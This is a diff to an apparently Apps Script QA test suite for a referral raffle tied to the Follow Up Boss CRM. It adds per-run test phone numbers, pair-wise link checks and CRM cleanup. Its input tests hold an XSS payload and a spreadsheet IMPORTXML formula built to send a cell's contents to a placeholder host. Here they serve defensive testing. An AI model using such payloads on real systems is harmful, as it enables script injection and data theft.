@@ -1726,6 +1726,11 @@ function raffleResetDrawDANGER() {
 // during the party.
 function raffleResetTest() {
   PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_PROP);
+  // And the EMAILED marker. Without this the second rehearsal of the day reports
+  // "the winner was already emailed at ..." and refuses -- right for the live
+  // draw, wrong for a test tab that was just wiped. Caught live 2026-09-17: the
+  // 15:14 run could not send a winner email because 15:00's marker survived.
+  PropertiesService.getScriptProperties().deleteProperty(RAFFLE_TEST_WINNER_EMAILED_PROP);
   var sh = raffleSheet_(true);
   var last = sh.getLastRow();
   if (last > 1) sh.deleteRows(2, last - 1);
@@ -1805,6 +1810,25 @@ function raffleQaRun_(cleanUp) {
   log.push('Live entries before: ' + liveBefore + ' (this number must not change)');
 
   var stamp = String(Date.now()).slice(-6);
+  // PER-RUN PHONE NUMBERS. The referral check matches on email OR phone. The QA
+  // phones used to be hardcoded ((215) 555-9101 and friends), so as soon as one
+  // run's QA referrals existed in FUB, every later run was correctly refused
+  // with "we already know that person". That is precisely what broke the 15:14
+  // run: fixing the API key made the lookup start working, and it found the
+  // contacts the 14:52 and 14:59 runs had left behind.
+  //
+  // Area 215, exchange derived from the run, line from the stamp plus a
+  // sequence. 555-01xx is reserved and the junk filter rejects it, so the
+  // exchange deliberately avoids 555 entirely rather than dodging one range.
+  var qaEx = 600 + (Number(stamp.slice(-2)) % 90);        // 600-689
+  var qaSeq = 0;
+  function qaPhone() {
+    qaSeq++;
+    var line = String((Number(stamp.slice(0, 4)) + qaSeq * 7) % 10000);
+    while (line.length < 4) line = '0' + line;
+    if (line.slice(0, 2) === '01') line = '9' + line.slice(1);   // never reserved
+    return '(215) ' + qaEx + '-' + line;
+  }
   function person(n, phone) {
     return {
       fullName: 'QA Tester' + n + ' Blockparty',
@@ -1859,7 +1883,7 @@ function raffleQaRun_(cleanUp) {
     opts = opts || {};
     var v = verifyFully(d);
     if (!v.ok || !v.verified) return v;
-    var ref = referralFor(n === undefined ? '1' : n, refPhone || '(215) 555-9101');
+    var ref = referralFor(n === undefined ? '1' : n, refPhone || qaPhone());
     var staged = json(raffleHandleSubmission_(
       Object.assign({ step: 'referral', vid: v.vid }, ref)));
     if (!staged.ok || !staged.staged) return staged;
@@ -1901,7 +1925,7 @@ function raffleQaRun_(cleanUp) {
 
   // ---- 2. Two-step verification ------------------------------------------
   section('2. Two-step verification');
-  var a = person(1, '(215) 555-8101');
+  var a = person(1, qaPhone());
   var r1 = request(a);
   check('step 1 asks for a code', r1.ok === true && r1.needsCode === true, JSON.stringify(r1));
   check('step 1 wrote NOTHING yet', raffleReadEntries_(true).length === 0);
@@ -1927,7 +1951,7 @@ function raffleQaRun_(cleanUp) {
 
   // ---- 3. The referral, and the consent it waits on ----------------------
   section('3. Referral -> invite -> consent');
-  var refA = referralFor('1', '(215) 555-9101');
+  var refA = referralFor('1', qaPhone());
   var staged = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: good.vid }, refA)));
   check('the referral is staged', staged.ok === true && staged.staged === true, JSON.stringify(staged));
   check('a second row exists now', raffleReadEntries_(true).length === 2);
@@ -1976,7 +2000,8 @@ function raffleQaRun_(cleanUp) {
 
   // ---- 3b. One BONUS per REFERRED PERSON ---------------------------------
   section('3b. One bonus per referred person');
-  var b = person('9', '(215) 555-8199');
+  var bPhone = qaPhone();
+  var b = person('9', bPhone);
   var vB = verifyFully(b);
   check('a second entrant verifies fine', vB.ok === true && vB.verified === true, JSON.stringify(vB));
   var stolen = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, refA)));
@@ -1986,15 +2011,15 @@ function raffleQaRun_(cleanUp) {
         String(stolen.error));
   check('no extra referral row was written',
         raffleReadEntries_(true).filter(function (r) { return r.isReferralRow; }).length === 1);
-  var self = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, referralFor('9', '(215) 555-8199'), {
+  var self = json(raffleHandleSubmission_(Object.assign({ step: 'referral', vid: vB.vid }, referralFor('9', bPhone), {
     referralEmail: b.email, referralPhone: b.phone })));
   check('and they cannot refer themselves', self.ok === false, JSON.stringify(self));
 
   // ---- 4. More entrants + counts -----------------------------------------
   section('4. Additional entrants and counts');
-  [['2','(215) 555-8102','(215) 555-9102'],
-   ['3','(215) 555-8103','(215) 555-9103'],
-   ['4','(267) 555-8104','(215) 555-9104']].forEach(function (p) {
+  [['2', qaPhone(), qaPhone()],
+   ['3', qaPhone(), qaPhone()],
+   ['4', qaPhone(), qaPhone()]].forEach(function (p) {
     var res = enterFully(person(p[0], p[1]), p[0], p[2]);
     check('entrant ' + p[0] + ' accepted', res.ok === true && !res.already, JSON.stringify(res));
   });
@@ -2045,34 +2070,62 @@ function raffleQaRun_(cleanUp) {
     var notes = raffleFubCall_('https://api.followupboss.com/v1/notes?personId=' +
                                encodeURIComponent(entrantRow.fubId) + '&limit=25',
                                'get', null, relKey0);
-    check('FUB can be asked for the entrant\'s notes', notes.ok === true,
+    check('FUB can be asked for a contact\'s notes', notes.ok === true,
           notes.code + ': ' + String(notes.text).slice(0, 160));
     var noteArr = (notes.ok && notes.body &&
                    (notes.body.notes || notes.body.Notes)) || [];
-    var logged = noteArr.filter(function (n) {
-      return /Email sent:/.test(String(n.subject || '')); });
-    check('the emails we sent are logged on the contact timeline',
-          logged.length > 0,
-          'no "Email sent:" note on person ' + entrantRow.fubId +
-          ' — the timeline will not show what this contact was told');
-    log.push('      timeline: ' + noteArr.length + ' note(s), ' + logged.length +
-             ' of them logged emails.');
+    log.push('      timeline (first entrant): ' + noteArr.length + ' note(s).');
   }
 
   // The relationship, which is the part that had never once worked.
-  if (entrantRow && refRow && entrantRow.fubId && refRow.referralFubId) {
-    var relApiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  //
+  // Both sides come off the REFERRAL row, which carries the entrant's FUB id and
+  // the referral's. Reading the entrant from "the first self row" instead picked
+  // an entrant who happened not to have a consented referral, so the check asked
+  // FUB about the wrong person and failed for the wrong reason.
+  // Ask about EVERY consented pair and require at least one to be linked. The
+  // requirement is "linking works", not "the first row happens to be linked":
+  // picking one row asked FUB about a pair whose link had legitimately not been
+  // attempted and failed for the wrong reason.
+  var pairs = raffleReadEntries_(true).filter(function (r) {
+    return r.isReferralRow && r.status === RAFFLE_STATUS_ELIGIBLE &&
+           r.fubId && r.referralFubId; });
+  check('there is at least one consented pair with both FUB ids',
+        pairs.length > 0, 'no eligible referral row carries both ids');
+  var linkedRow = pairs[0], anyLinked = false, relOk = false, probe = '';
+  var relApiKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+  pairs.forEach(function (r) {
+    if (anyLinked) return;
     var rel = raffleFubCall_('https://api.followupboss.com/v1/peopleRelationships?personId=' +
-                             encodeURIComponent(entrantRow.fubId), 'get', null, relApiKey);
-    check('FUB can be asked for the entrant\'s relationships', rel.ok === true,
-          rel.code + ': ' + String(rel.text).slice(0, 160));
-    var relArr = (rel.ok && rel.body && (rel.body.peoplerelationships ||
-                  rel.body.peopleRelationships || rel.body.relationships)) || [];
-    check('the entrant is LINKED to the person they referred',
-          relArr.length > 0,
-          'no relationship exists — linking is failing silently; run ' +
-          'raffleInspectFubRelationships(' + entrantRow.fubId + ', ' +
-          refRow.referralFubId + ') to have FUB name the field it wants');
+                             encodeURIComponent(r.fubId), 'get', null, relApiKey);
+    if (rel.ok) relOk = true;
+    var arr = (rel.ok && rel.body && (rel.body.peoplerelationships ||
+               rel.body.peopleRelationships || rel.body.relationships)) || [];
+    if (arr.length > 0) { anyLinked = true; linkedRow = r; }
+    else if (!probe) probe = r.fubId + ', ' + r.referralFubId;
+  });
+  if (pairs.length) {
+    check('FUB can be asked for a contact\'s relationships', relOk === true,
+          'every relationship GET failed');
+    check('an entrant is LINKED to the person they referred', anyLinked,
+          'NO pair is linked across ' + pairs.length + ' consented referral(s) — ' +
+          'linking is failing silently; run raffleInspectFubRelationships(' + probe +
+          ') to have FUB name the field it wants');
+  }
+
+  // And the timeline check, on an entrant who actually had mail sent about them.
+  if (linkedRow && linkedRow.fubId) {
+    var nKey = PropertiesService.getScriptProperties().getProperty('FUB_API_KEY');
+    var tl = raffleFubCall_('https://api.followupboss.com/v1/notes?personId=' +
+                            encodeURIComponent(linkedRow.fubId) + '&limit=25',
+                            'get', null, nKey);
+    var tlArr = (tl.ok && tl.body && (tl.body.notes || tl.body.Notes)) || [];
+    var tlLogged = tlArr.filter(function (n) {
+      return /Email sent:/.test(String(n.subject || '')); });
+    check('that entrant\'s timeline carries the emails we sent them',
+          tlLogged.length > 0,
+          'person ' + linkedRow.fubId + ' has ' + tlArr.length +
+          ' note(s) and none of them is a logged email');
   }
 
   // ---- 5. The draw --------------------------------------------------------
@@ -2111,7 +2164,7 @@ function raffleQaRun_(cleanUp) {
   var xssName = '<img src=x onerror=alert(1)> QA Tester ' + stamp;
   var xssRes = enterFully({ fullName: xssName,
     email: RAFFLE_QA_ADDRESS_BASE + stamp + '-xss' + RAFFLE_QA_DOMAIN,
-    phone: '(215) 555-8105', consent: 'Yes' }, 'xss', '(215) 555-9105');
+    phone: qaPhone(), consent: 'Yes' }, 'xss', qaPhone());
   check('an entry with markup in the name is accepted (it is only text)', xssRes.ok === true,
         JSON.stringify(xssRes));
   var sOut = raffleStatusPage_(true);
@@ -2123,7 +2176,7 @@ function raffleQaRun_(cleanUp) {
   var formulaName = '=IMPORTXML("https://example.invalid/?d="&C2,"//a") QA ' + stamp;
   var fRes = enterFully({ fullName: formulaName,
     email: RAFFLE_QA_ADDRESS_BASE + stamp + '-csv' + RAFFLE_QA_DOMAIN,
-    phone: '(215) 555-8106', consent: 'Yes' }, 'csv', '(215) 555-9106');
+    phone: qaPhone(), consent: 'Yes' }, 'csv', qaPhone());
   check('an entry with a formula in the name is accepted (it is only text)', fRes.ok === true,
         JSON.stringify(fRes));
   // Find the row by NAME, not getLastRow(): a journey now ends with the
@@ -2173,8 +2226,9 @@ function raffleQaRun_(cleanUp) {
 
   // A pending referral to look at: staged off the session from section 2, so it
   // adds a row but no new entrant.
+  var livePhone = qaPhone();
   var pend = json(raffleHandleSubmission_(Object.assign(
-    { step: 'referral', vid: good.vid }, referralFor('live', '(215) 555-9150'))));
+    { step: 'referral', vid: good.vid }, referralFor('live', livePhone))));
   check('a referral can be staged for the page tests',
         pend.ok === true && pend.staged === true, JSON.stringify(pend));
   if (pend.staged) {
@@ -2197,7 +2251,7 @@ function raffleQaRun_(cleanUp) {
     // Consent through it, which mints the chain token.
     var cRes = json(raffleHandleSubmission_({
       step: 'consent', decision: 'confirm', token: pend.token, consent: 'Yes',
-      referralName: 'QA Referrallive Blockparty', referralPhone: '(215) 555-9150',
+      referralName: 'QA Referrallive Blockparty', referralPhone: livePhone,
       referralRole: 'Buyer', referralTimeframe: raffleDefaultTimeframe_(raffleTimeframes_()) || '' }));
     check('consent through the page works', cRes.ok === true, JSON.stringify(cRes));
 
@@ -2230,7 +2284,7 @@ function raffleQaRun_(cleanUp) {
   // invite, and deliberately leaves it unanswered -- which is the exact state
   // most of Saturday afternoon will be in.
   var waiting = json(raffleHandleSubmission_(Object.assign(
-    { step: 'referral', vid: good.vid }, referralFor('wait', '(215) 555-9160'))));
+    { step: 'referral', vid: good.vid }, referralFor('wait', qaPhone()))));
   check('a referral is left waiting, to be reminded',
         waiting.ok === true && waiting.staged === true, JSON.stringify(waiting));
   if (waiting.staged) {
@@ -2312,7 +2366,7 @@ function raffleQaRun_(cleanUp) {
 
     var rd = request({ fullName: 'QA Delivery Blockparty',
                        email: RAFFLE_QA_ADDRESS_BASE + stamp + '-deliver' + RAFFLE_QA_DOMAIN,
-                       phone: '(215) 555-8100', consent: 'Yes' });
+                       phone: qaPhone(), consent: 'Yes' });
     check('a code was requested', rd.ok === true && rd.needsCode === true, JSON.stringify(rd));
     try { after = MailApp.getRemainingDailyQuota(); } catch (qErr2) { after = -1; }
     check('the mail service accepted the code email (quota went down)',
@@ -2339,6 +2393,26 @@ function raffleQaRun_(cleanUp) {
   check('the 6:15 trigger is still armed',
         ScriptApp.getProjectTriggers().filter(function (t) {
           return t.getHandlerFunction() === 'raffleScheduledDraw'; }).length === 1);
+
+  // FUB CLEANUP, BEFORE the tab is wiped -- the rows are the only record of which
+  // contacts this run created.
+  //
+  // This is not tidiness. The QA contacts are real FUB people, and the referral
+  // check matches on email OR phone, so a run that leaves them behind makes the
+  // NEXT run refuse its own referrals with "we already know that person". That
+  // is exactly what turned the 15:14 run into 23 failures: the key was fixed,
+  // the lookup started working, and it found what 14:52 and 14:59 had left.
+  var qaIds = [];
+  raffleReadEntries_(true).forEach(function (r) {
+    if (r.fubId) qaIds.push(r.fubId);
+    if (r.referralFubId) qaIds.push(r.referralFubId);
+  });
+  var purge = raffleDeleteFubContactsById_(qaIds);
+  check('this run cleaned its own FUB contacts up',
+        purge.failed === 0,
+        purge.deleted + ' deleted, ' + purge.failed + ' failed, ' + purge.skipped +
+        ' skipped — anything left behind will make the NEXT run refuse its referrals');
+  log.push('      FUB cleanup: ' + purge.summary);
 
   // ---- 7. Cleanup ---------------------------------------------------------
   section('7. Cleanup');
